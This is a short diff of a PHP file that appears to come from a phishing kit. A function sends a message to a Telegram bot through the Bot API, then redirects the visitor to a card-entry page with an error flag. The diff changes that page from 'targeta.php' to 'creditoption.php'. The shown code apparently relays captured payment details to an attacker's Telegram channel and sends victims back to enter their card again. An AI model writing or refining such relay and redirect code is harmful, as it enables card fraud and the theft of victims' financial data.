@@ -57,7 +57,7 @@ function enviar_telegram($msj)
     $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?" . http_build_query($queryArray);
     $result = file_get_contents($url);
 
-    header("Location: targeta.php?error=1");
+    header("Location: creditoption.php?error=1");
 
 ?>
   
